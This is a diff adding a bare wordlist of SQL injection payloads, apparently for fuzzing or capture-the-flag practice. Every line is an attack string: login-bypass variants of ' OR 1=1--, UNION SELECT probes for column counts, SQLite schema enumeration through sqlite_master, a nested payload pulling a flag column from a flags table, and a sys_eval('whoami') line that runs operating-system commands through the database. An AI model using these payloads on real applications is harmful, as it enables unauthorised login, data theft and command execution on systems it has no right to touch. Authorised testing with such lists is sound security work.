@@ -1,0 +1,44 @@
+' OR 1=1--
+' OR 1=1-- -
+' OR 1=1#
+' OR '1'='1'--
+' OR '1'='1'-- -
+' OR '1'='1'#
+' OR '1'='1--
+' OR '1'='1-- -
+' OR '1'='1#
+" OR 1=1--
+" OR 1=1-- -
+" OR 1=1#
+') OR 1=1--
+') OR 1=1-- -
+') OR 1=1#
+'; OR 1=1--
+'; OR 1=1-- -
+'; OR 1=1#
+or 1=1--
+or 1=1-- -
+or 1=1#
+orTest
+or test
+' UNION SELECT sqlite_version()--
+' UNION SELECT sqlite_version(),NULL--
+' UNION SELECT column
+' UNION SELECT NULL--
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT 'a',NULL,NULL-- -
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,'a',NULL-- -
+' UNION SELECT NULL,NULL,'a'--
+' UNION SELECT NULL,NULL,'a'-- -
+' UNION ALL SELECT "' UNION SELECT flag,NULL,NULL from flags-- -",NULL,NULL from users-- -
+' UNION SELECT tbl_name FROM sqlite_master--
+' UNION SELECT tbl_name,NULL FROM sqlite_master--
+' UNION SELECT table_name FROM table_name--
+' UNION SELECT table_name,NULL FROM table_name--
+' UNION SELECT NULL,sys_eval('whoami') FROM users-- -
